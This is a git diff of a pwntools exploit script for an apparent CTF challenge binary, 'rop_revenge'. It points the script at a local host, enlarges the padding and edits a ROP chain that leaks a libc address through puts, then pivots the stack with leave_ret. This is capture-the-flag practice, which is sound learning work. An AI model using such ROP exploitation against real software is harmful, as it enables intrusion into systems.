@@ -8,7 +8,7 @@ context.arch = 'amd64'
 e , l = ELF('./rop_revenge') , ELF('./libc.so.6')
 
 host , port = 'ctf.yuawn.idv.tw' , 10109
-#host , port = '192.168.78.135' , 4000
+host , port = '192.168.78.135' , 4000
 y = remote( host , port )
 
 name = 0x601080
@@ -19,7 +19,8 @@ leave_ret = 0x4006d1
 
 
 p = flat(
-    'D' * 0xe0,
+    'D' * 0x1d0,
+    main,
     pop_rdi,
     e.got['__libc_start_main'],
     e.plt['puts'],
@@ -30,7 +31,7 @@ y.sendafter( '?' , p )
 
 p = flat(
     'D' * 0x20,
-    name + 0xe0 - 8,
+    name + 0x1d0 - 8,
     leave_ret
 )
 
